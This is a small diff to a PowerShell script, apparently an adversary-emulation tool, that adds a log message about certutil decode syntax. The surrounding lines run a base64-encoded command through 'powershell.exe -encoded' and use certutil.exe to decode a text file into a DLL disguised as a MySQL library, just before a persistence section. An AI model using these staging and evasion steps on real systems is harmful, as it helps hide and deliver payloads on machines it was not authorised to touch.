@@ -48,6 +48,7 @@ $unsignedrand64 = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetB
 powershell.exe -encoded "$unsignedrand64"
 
 #Execution
+Write-Host "Use certutil.exe with decode syntax"
 Start-Process -FilePath "$env:windir\system32\certutil.exe" -ArgumentList "-f -decode $ThreatBox\tools\MySql.Data3.dll.txt $ThreatBox\tools\MySql.Data3.dll"
 
 # Persistance
